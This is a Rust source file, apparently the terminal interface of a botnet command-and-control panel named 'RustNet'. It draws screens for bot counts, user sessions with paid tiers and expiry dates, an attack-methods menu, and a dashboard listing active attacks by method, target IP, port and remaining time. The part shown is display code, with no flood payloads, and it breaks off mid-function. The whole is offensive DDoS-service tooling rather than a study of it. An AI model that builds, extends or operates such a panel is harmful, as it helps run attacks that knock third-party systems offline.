use std::sync::Arc;
use std::time::Duration;
use crate::modules::client_manager::Client;
use crate::modules::state::AppState;
use crate::modules::error::Result;
use crate::modules::auth::Level;
use super::ui::*;

pub async fn render_status_bar(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    let max_attacks = state.config.read().await.max_attacks;
    
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    
    let breadcrumb = client.get_breadcrumb().await;
    let width = get_terminal_width();
    
    // Position cursor at row 31 to reserve row 32 for the prompt
    client.write(b"\x1b[31;1H").await?;
    
    // Combined line: Breadcrumb on left, Status on right (120 char width)
    let uptime_str = if days > 0 {
        format!("{}d {}h", days, hours)
    } else if hours > 0 {
        format!("{}h {}m", hours, minutes)
    } else {
        format!("{}m", minutes)
    };
    
    let status_right = format!(
        "\x1b[38;5;82m[B:\x1b[38;5;51m{}\x1b[38;5;82m][U:\x1b[38;5;51m{}\x1b[38;5;82m][A:\x1b[38;5;51m{}/{}\x1b[38;5;82m][Up:\x1b[38;5;51m{}\x1b[38;5;82m]\x1b[0m",
        bot_count, client_count, attack_count, max_attacks, uptime_str
    );
    
    // Calculate padding to push status to the right
    let breadcrumb_display = format!("\x1b[38;5;51m→ {}\x1b[0m", breadcrumb);
    let breadcrumb_len = breadcrumb.len() + 2; // arrow + space + text
    let status_len = format!("[B:{}][U:{}][A:{}/{}][Up:{}]", bot_count, client_count, attack_count, max_attacks, uptime_str).len();
    let padding = if breadcrumb_len + status_len + 1 < width {
        width - breadcrumb_len - status_len
    } else {
        1
    };
    
    client.write(format!(
        "{}{:width$}{}\x1b[K\r",
        breadcrumb_display,
        "",
        status_right,
        width = padding
    ).as_bytes()).await?;
    
    Ok(())
}

pub async fn show_prompt(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    render_status_bar(client, state).await?;
    client.write(b"\x1b[32;1H").await?; // Move to last row for prompt
    client.write(b"\x1b[K").await?;    // Clear existing content on the row
    client.write(b"[\x1b[38;5;201mPrompt\x1b[0m]> ").await?;
    Ok(())
}

pub async fn handle_help_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let user_level = client.user.get_level();

    for line in HELP_SCREEN_LINES {
        client.write(line.as_bytes()).await?;
    }

    if user_level >= Level::Admin {
        client.write(" \x1b[38;5;198m▸ admin\x1b[0m".as_bytes()).await?;
    }
    if user_level >= Level::Owner {
        client.write(" \x1b[38;5;196m▸ owner\x1b[0m".as_bytes()).await?;
    }

    client.set_breadcrumb("Home > Help").await;
    show_prompt(client, state).await?;

    Ok(())
}

pub async fn handle_stats_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;
    
    // Top border
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    // Title
    let title = apply_gradient("Server Statistics", 33, 51);
    let title_text = format!("§ {} §", title);
    let title_padding = main_width - visible_len("§ Server Statistics §") - 2;
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
    
    // Stats content
    let bot_gradient = apply_gradient(&bot_count.to_string(), 39, 51);
    let bot_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mBots Connected: {}\x1b[38;5;240m", bot_gradient);
    let bot_pad = main_width - visible_len(&format!("Bots Connected: {}", bot_count)) - 2;
    client.write(format!("{}{}{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", bot_line, " ".repeat(bot_pad), " ").as_bytes()).await?;
    
    let client_gradient = apply_gradient(&client_count.to_string(), 39, 51);
    let client_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mUsers Connected: {}\x1b[38;5;240m", client_gradient);
    let client_pad = main_width - visible_len(&format!("Users Connected: {}", client_count)) - 2;
    client.write(format!("{}{}{}║                              ║\n\r", client_line, " ".repeat(client_pad), " ").as_bytes()).await?;
    
    let attack_gradient = apply_gradient(&format!("{}/{}", attack_count, state.config.read().await.max_attacks), 39, 51);
    let attack_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mActive Attacks: {}\x1b[38;5;240m", attack_gradient);
    let attack_pad = main_width - visible_len(&format!("Active Attacks: {}/{}", attack_count, state.config.read().await.max_attacks)) - 2;
    client.write(format!("{}{}{}║                              ║\n\r", attack_line, " ".repeat(attack_pad), " ").as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    client.set_breadcrumb("Home > Server Stats").await;
    Ok(())
}

pub async fn handle_health_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    
    let status = if bot_count > 0 && client_count > 0 { "HEALTHY" } else { "DEGRADED" };
    let status_color = if status == "HEALTHY" { 82 } else { 196 };
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;
    
    // Top border
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    // Title
    let title = apply_gradient("System Health Check", 33, 51);
    let title_text = format!("§ {} §", title);
    let title_padding = main_width - visible_len("§ System Health Check §") - 2;
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
    
    // Health content
    let status_gradient = apply_gradient(status, status_color, status_color + 6);
    let status_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mStatus: {}\x1b[38;5;240m", status_gradient);
    let status_pad = main_width - visible_len(&format!("Status: {}", status)) - 2;
    client.write(format!("{}{}{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", status_line, " ".repeat(status_pad), " ").as_bytes()).await?;
    
    let uptime_str = format!("{}d {}h {}m", days, hours, minutes);
    let uptime_gradient = apply_gradient(&uptime_str, 39, 51);
    let uptime_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mUptime: {}\x1b[38;5;240m", uptime_gradient);
    let uptime_pad = main_width - visible_len(&format!("Uptime: {}d {}h {}m", days, hours, minutes)) - 2;
    client.write(format!("{}{}{}║                              ║\n\r", uptime_line, " ".repeat(uptime_pad), " ").as_bytes()).await?;
    
    let bots_gradient = apply_gradient(&bot_count.to_string(), 39, 51);
    let bots_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mBots: {}\x1b[38;5;240m", bots_gradient);
    let bots_pad = main_width - visible_len(&format!("Bots: {}", bot_count)) - 2;
    client.write(format!("{}{}{}║                              ║\n\r", bots_line, " ".repeat(bots_pad), " ").as_bytes()).await?;
    
    let clients_gradient = apply_gradient(&client_count.to_string(), 39, 51);
    let clients_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mClients: {}\x1b[38;5;240m", clients_gradient);
    let clients_pad = main_width - visible_len(&format!("Clients: {}", client_count)) - 2;
    client.write(format!("{}{}{}║                              ║\n\r", clients_line, " ".repeat(clients_pad), " ").as_bytes()).await?;
    
    let attacks_gradient = apply_gradient(&attack_count.to_string(), 39, 51);
    let attacks_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mActive Attacks: {}\x1b[38;5;240m", attacks_gradient);
    let attacks_pad = main_width - visible_len(&format!("Active Attacks: {}", attack_count)) - 2;
    client.write(format!("{}{}{}║                              ║\n\r", attacks_line, " ".repeat(attacks_pad), " ").as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    client.set_breadcrumb("Home > Health Check").await;
    Ok(())
}

pub async fn handle_online_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let clients = state.client_manager.get_all_clients().await;
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;

    // Top border
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    // Title with gradient
    let title = apply_gradient("Online Users", 33, 51);
    let title_text = format!("§ {} §", title);
    let title_padding = main_width - visible_len("§ Online Users §") - 2;
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
    
    if clients.is_empty() {
        let msg = "No users online";
        let padding = main_width - visible_len(msg) - 3;
        client.write(format!("\x1b[38;5;240m║  \x1b[38;5;245m{}\x1b[38;5;240m{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", msg, " ".repeat(padding)).as_bytes()).await?;
    } else {
        for (i, c) in clients.iter().enumerate() {
            let level_color = match c.user.get_level() {
                Level::Owner => 39,
                Level::Admin => 45,
                Level::Pro => 87,
                Level::Basic => 195,
            };
            let indicator = if c.id == client.id { "●" } else { "○" };
            let right_panel = if i == 0 { "░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║" } else { "                              ║" };
            
            let addr_str = c.address.to_string();
            let username_gradient = apply_gradient(&c.user.username, level_color, level_color + 6);
            
            let addr_display = &addr_str[..addr_str.len().min(22)];
            let addr_gradient = apply_gradient(addr_display, 39, 45);
            let addr_vis = visible_len(addr_display);
            let addr_pad = if 22 > addr_vis { 22 - addr_vis } else { 0 };
            let addr_field = format!("{}{}", addr_gradient, " ".repeat(addr_pad));
            
            // Calculate dynamic padding
            let visible_content = 2 + c.user.username.len() + 1 + addr_vis;
            let padding = if main_width > visible_content + 2 { main_width - visible_content - 2 } else { 0 };
            
            let line = format!(
                "\x1b[38;5;240m║ \x1b[38;5;245m{}\x1b[38;5;240m {} {}{}\x1b[38;5;240m ║ {}",
                indicator,
                username_gradient,
                addr_field,
                " ".repeat(padding),
                right_panel
            );
            client.write(format!("{}\n\r", line).as_bytes()).await?;
        }
    }
    
    client.write(format!("\x1b[38;5;240m╠{}╩{}╣\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    let total_str = format!("  Total: {} user(s) online", clients.len());
    let total_padding = width - total_str.len() - 2;
    let total_line = format!("\x1b[38;5;240m║  Total: \x1b[38;5;39m{} user(s)\x1b[38;5;240m online{}\x1b[38;5;240m║", clients.len(), " ".repeat(total_padding));
    client.write(format!("{}\n\r", total_line).as_bytes()).await?;
    client.write(format!("\x1b[38;5;240m╰{}╯\n\r", "═".repeat(width - 2)).as_bytes()).await?;
    
    client.set_breadcrumb("Home > Online Users").await;
    Ok(())
}

pub async fn handle_whoami_command(client: &Arc<Client>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;

    // Top border
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    // Title with gradient
    let title = apply_gradient("Your Information", 33, 51);
    let title_text = format!("§ {} §", title);
    let title_padding = main_width - visible_len("§ Your Information §") - 2;
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
    
    let level_color = match client.user.get_level() {
        Level::Owner => 39,
        Level::Admin => 45,
        Level::Pro => 87,
        Level::Basic => 195,
    };
    
    let username_gradient = apply_gradient(&client.user.username, 33, 51);
    let level_gradient = apply_gradient(client.user.get_level().to_str(), level_color, level_color + 6);
    
    // Dynamic padding calculation
    let user_pad = if main_width > 12 + client.user.username.len() { main_width - 12 - client.user.username.len() } else { 0 };
    let username_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mUsername: {}{}\x1b[38;5;240m║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║", username_gradient, " ".repeat(user_pad));
    client.write(format!("{}\n\r", username_line).as_bytes()).await?;
    
    let level_pad = if main_width > 9 + client.user.get_level().to_str().len() { main_width - 9 - client.user.get_level().to_str().len() } else { 0 };
    let level_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mLevel: {}{}\x1b[38;5;240m║                              ║", level_gradient, " ".repeat(level_pad));
    client.write(format!("{}\n\r", level_line).as_bytes()).await?;
    
    let addr_pad = if main_width > 11 + client.address.len() { main_width - 11 - client.address.len() } else { 0 };
    let address_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mAddress: \x1b[38;5;39m{}{}\x1b[38;5;240m║                              ║", client.address, " ".repeat(addr_pad));
    client.write(format!("{}\n\r", address_line).as_bytes()).await?;
    
    let expire_str = client.user.expire.format("%Y-%m-%d %H:%M").to_string();
    let expire_pad = if main_width > 11 + expire_str.len() { main_width - 11 - expire_str.len() } else { 0 };
    let expires_line = format!("\x1b[38;5;240m║ \x1b[38;5;245mExpires: \x1b[38;5;39m{}{}\x1b[38;5;240m║                              ║", expire_str, " ".repeat(expire_pad));
    client.write(format!("{}\n\r", expires_line).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    client.set_breadcrumb("Home > User Info").await;
    Ok(())
}

pub async fn handle_uptime_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    let seconds = uptime.as_secs() % 60;
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;

    // Top border
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    // Title with gradient
    let title = apply_gradient("Server Uptime", 33, 51);
    let title_text = format!("§ {} §", title);
    let title_padding = main_width - visible_len("§ Server Uptime §") - 2;
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
    
    let days_str = apply_gradient(&format!("{}d", days), 39, 45);
    let hours_str = apply_gradient(&format!("{}h", hours), 45, 51);
    let minutes_str = apply_gradient(&format!("{}m", minutes), 51, 87);
    let seconds_str = apply_gradient(&format!("{}s", seconds), 87, 195);
    
    let visible_len = 2 + format!("{}d", days).len() + 1 + format!("{}h", hours).len() + 1 + format!("{}m", minutes).len() + 1 + format!("{}s", seconds).len();
    let padding = if main_width > visible_len + 1 { main_width - visible_len - 1 } else { 0 };
    
    let uptime_line = format!("\x1b[38;5;240m║  {} {} {} {}{}\x1b[38;5;240m║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║", days_str, hours_str, minutes_str, seconds_str, " ".repeat(padding));
    client.write(format!("{}\n\r", uptime_line).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    client.set_breadcrumb("Home > Server Uptime").await;
    Ok(())
}

pub async fn handle_gif_command(client: &Arc<Client>, parts: &[&str]) -> Result<()> {
    use tokio::io::AsyncBufReadExt;
    use std::path::Path;

    let gifs_dir = Path::new("data/gifs");
    if !gifs_dir.exists() {
        client.write(b"\x1b[38;5;196m[X] GIFs directory not found (data/gifs)\n\r").await?;
        return Ok(());
    }

    // If no argument: list available .tfx files
    if parts.len() < 2 {
        let mut entries = tokio::fs::read_dir(gifs_dir).await?;
        let mut files: Vec<String> = Vec::new();
        while let Some(entry) = entries.next_entry().await? {
            let fi = entry.file_name().to_string_lossy().to_string();
            if fi.ends_with(".tfx") {
                files.push(fi);
            }
        }

        if files.is_empty() {
            client.write(b"\x1b[38;5;245mNo GIF files found\x1b[0m\n\r").await?;
            return Ok(());
        }

        client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
        
        let width = get_terminal_width();
        let side_width = 30;
        let main_width = width - side_width - 2;
        
        // Top border
        client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
        
        // Title
        let title = apply_gradient("Available GIFs", 39, 51);
        let title_text = format!("§ {} §", title);
        let title_padding = main_width - visible_len("§ Available GIFs §") - 2;
        let left_pad = title_padding / 2;
        let right_pad = title_padding - left_pad;
        client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
            " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
        
        client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
        
        for (i, f) in files.iter().enumerate() {
            let index_gradient = apply_gradient(&format!("{}.", i + 1), 245, 250);
            let file_gradient = apply_gradient(f, 39, 51);
            let line = format!("  {} {}", index_gradient, file_gradient);
            
            let visible = visible_len(&line);
            let padding = if main_width > visible + 1 { main_width - visible - 1 } else { 0 };
            let right_panel = if i == 0 { "░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║" } else { "                              ║" };
            
            client.write(format!("\x1b[38;5;240m║{}{}\x1b[38;5;240m║{}\n\r", line, " ".repeat(padding), right_panel).as_bytes()).await?;
        }
        
        client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
        
        return Ok(());
    }

    // Play specified file - accept with or without .tfx extension
    let mut filename = parts[1].to_string();
    if !filename.ends_with(".tfx") {
        filename.push_str(".tfx");
    }
    
    let base = Path::new(&filename)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(&filename);

    let path = gifs_dir.join(base);
    if tokio::fs::metadata(&path).await.is_err() {
        client.write(b"\x1b[38;5;196m[X] GIF file not found\n\r").await?;
        return Ok(());
    }

    let file = tokio::fs::File::open(&path).await?;
    let reader = tokio::io::BufReader::new(file);
    let mut lines = reader.lines();

    // Clear screen, clear scrollback, move home, hide cursor
    client.write(b"\x1b[2J\x1b[3J\x1b[H\x1b[?25l").await?;

    let mut buffer: Vec<u8> = Vec::with_capacity(4096);
    while let Some(line) = lines.next_line().await? {
        let l = line.trim_end_matches(&['\r', '\n'][..]).to_string();
        if l.contains("\x1b[") {
            buffer.extend_from_slice(l.as_bytes());
            buffer.extend_from_slice(b"\r\n");
            if buffer.len() > 2048 {
                client.write(buffer.as_slice()).await?;
                buffer.clear();
            }
        } else {
            if !buffer.is_empty() {
                client.write(buffer.as_slice()).await?;
                buffer.clear();
            }
            client.write(format!("{}\r\n", l).as_bytes()).await?;
        }
        tokio::time::sleep(Duration::from_millis(2)).await;
    }

    if !buffer.is_empty() {
        client.write(buffer.as_slice()).await?;
    }

    // Show cursor, clear screen and buffer after playback finishes
    client.write(b"\x1b[?25h").await?;
    tokio::time::sleep(Duration::from_millis(500)).await;
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;

    Ok(())
}

pub async fn handle_methods_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.set_breadcrumb("Home > Attack Methods").await;
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;

    for line in ATTACK_MENU_LINES {
        client.write(line.as_bytes()).await?;
    }

    show_prompt(client, state).await?;
    Ok(())
}

pub async fn handle_dashboard_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let bot_count = state.bot_manager.get_bot_count().await;
    let client_count = state.client_manager.get_client_count().await;
    let attack_count = state.attack_manager.get_active_count().await;
    let attacks = state.attack_manager.get_all_attacks().await;
    let user_attacks = state.attack_manager.get_user_attacks(&client.user.username).await;
    
    let uptime = state.started_at.elapsed();
    let days = uptime.as_secs() / 86400;
    let hours = (uptime.as_secs() % 86400) / 3600;
    let minutes = (uptime.as_secs() % 3600) / 60;
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;
    let left_width = main_width - 1;
    let right_width = side_width;
    
    let col1_width = 20;
    let col2_width = left_width - col1_width - 1;
    
    // Top border with title
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(left_width), "═".repeat(right_width)).as_bytes()).await?;
    
    let title = apply_gradient("RustNet Dashboard", 39, 51);
    let title_text = format!("§ {} §", title);
    let title_padding = left_width - visible_len("§ RustNet Dashboard §");
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╦{}╢  │    │    │    │    │    │  ║\n\r", 
        "═".repeat(col1_width), "═".repeat(col2_width)).as_bytes()).await?;
    
    // System Status section headers with gradients
    let sys_status = apply_gradient("System Status", 39, 51);
    let srv_info = apply_gradient("Server Information", 39, 51);
    
    let sys_pad = col1_width - visible_len("System Status");
    let srv_pad = col2_width - visible_len("Server Information");
    
    client.write(format!("\x1b[38;5;240m║{}{}{}║{}{}{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", 
        " ".repeat(sys_pad / 2), sys_status, " ".repeat(sys_pad - sys_pad / 2),
        " ".repeat(srv_pad / 2), srv_info, " ".repeat(srv_pad - srv_pad / 2)
    ).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╬{}╬{}╣\n\r", 
        "═".repeat(col1_width), "═".repeat(col2_width), "═".repeat(right_width)).as_bytes()).await?;
    
    let status = if bot_count > 0 && client_count > 0 { 
        apply_gradient("● HEALTHY", 51, 87)
    } else if bot_count == 0 {
        apply_gradient("● NO BOTS", 196, 160)
    } else {
        apply_gradient("● DEGRADED", 196, 160)
    };
    
    let uptime_gradient = apply_gradient(&format!("{}d {}h {}m", days, hours, minutes), 39, 51);
    let bot_gradient = apply_gradient(&bot_count.to_string(), 39, 51);
    
    let uptime_label = apply_gradient("Uptime:", 245, 250);
    let uptime_line_content = format!("{} {}", uptime_label, uptime_gradient);
    let uptime_pad = col1_width - visible_len(&format!("Uptime: {}d {}h {}m", days, hours, minutes)) - 1;
    
    let bots_label = apply_gradient("Bots:", 245, 250);
    let bots_line_content = format!("{} {}\x1b[38;5;240m/\x1b[38;5;245m{}", bots_label, bot_gradient, state.config.read().await.max_bot_connections);
    let bots_pad = col2_width - visible_len(&format!("Bots: {}/{}", bot_count, state.config.read().await.max_bot_connections)) - 1;
    
    let uptime_line = format!("\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ ╔══════════════════════════╗ ║", 
        uptime_line_content, " ".repeat(uptime_pad.max(0)), " ",
        bots_line_content, " ".repeat(bots_pad.max(0)), " ");
    client.write(format!("{}\n\r", uptime_line).as_bytes()).await?;
    
    let client_gradient = apply_gradient(&client_count.to_string(), 39, 51);
    
    let status_label = apply_gradient("Status:", 245, 250);
    let status_line_content = format!("{} {}", status_label, status);
    let status_pad = col1_width - visible_len(&format!("Status: {}", status)) - 2;
    
    let users_label = apply_gradient("Users:", 245, 250);
    let users_line_content = format!("{} {}\x1b[38;5;240m/\x1b[38;5;245m{}", users_label, client_gradient, state.config.read().await.max_user_connections);
    let users_pad = col2_width - visible_len(&format!("Users: {}/{}", client_count, state.config.read().await.max_user_connections)) - 2;
    
    let status_line = format!("\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ ║      SERVER  STATS       ║ ║", 
        status_line_content, " ".repeat(status_pad.max(0)), " ",
        users_line_content, " ".repeat(users_pad.max(0)), " ");
    client.write(format!("{}\n\r", status_line).as_bytes()).await?;
    
    let level_color = match client.user.get_level() {
        Level::Owner => 39,
        Level::Admin => 45,
        Level::Pro => 87,
        Level::Basic => 195,
    };
    let level_gradient = apply_gradient(client.user.get_level().to_str(), level_color, level_color + 6);
    let attack_gradient = apply_gradient(&attack_count.to_string(), 39, 51);
    
    let level_label = apply_gradient("Level:", 245, 250);
    let level_line_content = format!("{} {}", level_label, level_gradient);
    let level_pad = col1_width - visible_len(&format!("Level: {}", client.user.get_level().to_str())) - 1;
    
    let attacks_label = apply_gradient("Attacks:", 245, 250);
    let attacks_line_content = format!("{} {}\x1b[38;5;240m/\x1b[38;5;245m{}", attacks_label, attack_gradient, state.config.read().await.max_attacks);
    let attacks_pad = col2_width - visible_len(&format!("Attacks: {}/{}", attack_count, state.config.read().await.max_attacks)) - 1;
    
    let attacks_line = format!("\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ {} {}{}\x1b[38;5;240m║ ║  ┌──────────────────┐    ║ ║", 
        level_line_content, " ".repeat(level_pad.max(0)), " ",
        attacks_line_content, " ".repeat(attacks_pad.max(0)), " ");
    client.write(format!("{}\n\r", attacks_line).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╩{}╢ ║  │ ◉ Active Attacks │    ║ ║\n\r", 
        "═".repeat(left_width), "═".repeat(right_width)).as_bytes()).await?;
    
    let active_title = apply_gradient("Active Attacks", 39, 51);
    let active_text = format!("§ {} §", active_title);
    let active_padding = left_width - visible_len("§ Active Attacks §");
    let active_left = active_padding / 2;
    let active_right = active_padding - active_left;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ║  │ ◉ User Sessions  │    ║ ║\n\r",
        " ".repeat(active_left), active_text, " ".repeat(active_right)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╢ ║  │ ◉ Bot Network    │    ║ ║\n\r", 
        "═".repeat(left_width)).as_bytes()).await?;
    
    if attacks.is_empty() {
        let msg = "No active attacks running";
        let pad = left_width - visible_len(msg) - 2;
        client.write(format!("\x1b[38;5;240m║ \x1b[38;5;245m{}\x1b[38;5;240m{}║ ║  └──────────────────┘    ║ ║\n\r", msg, " ".repeat(pad)).as_bytes()).await?;
    } else {
        for (i, attack) in attacks.iter().take(3).enumerate() {
            let remaining = attack.remaining_duration().as_secs();
            let method_color = match attack.method.as_str() {
                m if m.contains("slow") => 39,
                m if m.contains("ssl") => 45,
                m if m.contains("http") || m.contains("websocket") => 51,
                m if m.contains("udp") => 87,
                _ => 195
            };
            
            let right_panel = match i {
                0 => "║  └──────────────────┘    ║ ║",
                1 => "║                          ║ ║",
                _ => "║    [REAL-TIME STATUS]    ║ ║"
            };
            
            let ip_str = attack.ip.to_string();
            let method_gradient = apply_gradient(&attack.method.trim_start_matches('!')[..attack.method.len().min(10)], method_color, method_color + 6);
            let id_gradient = apply_gradient(&attack.id.to_string(), 245, 250);
            let ip_gradient = apply_gradient(&ip_str[..ip_str.len().min(15)], 39, 45);
            let port_gradient = apply_gradient(&attack.port.to_string(), 245, 250);
            let time_gradient = apply_gradient(&format!("{}s", remaining), 51, 57);
            
            let attack_line = format!(
                "\x1b[38;5;240m║ {} {:<10}\x1b[38;5;240m→{:<15}:{:<5} {}",
                id_gradient,
                method_gradient,
                ip_gradient,
                port_gradient,
                time_gradient
            );
            
            let visible = visible_len(&attack_line);
            let padding = left_width.saturating_sub(visible);
            
